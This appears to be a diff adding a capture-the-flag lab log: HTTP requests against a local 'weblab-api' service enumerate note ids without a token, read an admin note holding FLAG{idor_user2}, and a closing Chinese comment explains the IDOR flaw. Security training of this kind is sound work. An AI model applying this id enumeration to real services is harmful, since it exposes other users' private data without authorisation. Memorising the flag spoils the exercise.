@@ -1,0 +1,7 @@
+GET http://127.0.0.1:18081/ -> 200
+{"service": "weblab-api", "endpoints": ["/login", "/notes?id=", "/admin/config", "/files?name="], "hint": "token=base64({json uid}) ; notes?id= may not check ownership"}
+GET http://127.0.0.1:18081/notes?id=0 -> {"error": "no note"}
+GET http://127.0.0.1:18081/notes?id=1 -> {"id": "1", "note": "alice-note", "viewer": null}
+GET http://127.0.0.1:18081/notes?id=2 -> {"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+GET http://127.0.0.1:18081/notes?id=3..5 -> {"error": "no note"}
+说明: /notes?id= 未做归属校验，未带任何 token 即可读到他人（uid=2/admin）的 note，构成 IDOR，取得 FLAG{idor_user2}。
